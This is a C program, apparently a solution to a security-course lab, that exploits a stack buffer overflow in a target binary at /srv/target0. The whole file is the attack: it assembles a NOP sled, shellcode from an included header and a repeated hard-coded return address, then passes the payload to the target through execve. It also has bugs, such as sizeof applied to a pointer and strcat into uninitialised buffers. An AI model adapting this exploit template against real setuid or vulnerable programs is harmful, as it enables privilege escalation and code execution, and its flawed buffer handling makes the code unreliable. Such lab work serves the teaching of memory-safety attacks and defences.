#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target0"

char *get_repeat_string(char *s, int x)
{
  char *res = malloc(sizeof(s) * x + 1);
  while (x > 0) {
      strcat(res, s);
      x --;
  }
  return res;
}

int main(void)
{
  char *args[3]; 
  char *env[1];

  char *noop = "\x90";
  char *rt_address = "\x67\xde\xff\xff";

  int num_nop = 201;
  int sc_len = sizeof(shellcode)/sizeof(shellcode[0]);
  int num_return_addr = 38;
  char injected_sc[num_nop + sc_len + num_return_addr*4 + 1];
  
  int i;
  char *nop_sled = get_repeat_string(noop, num_nop);
  strcat(injected_sc, nop_sled);
  strcat(injected_sc, shellcode);
  char *rt_addrs = get_repeat_string(rt_address, num_return_addr);
  strcat(injected_sc, rt_addrs);
  
  args[0] = TARGET;
  args[1] = injected_sc; 
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

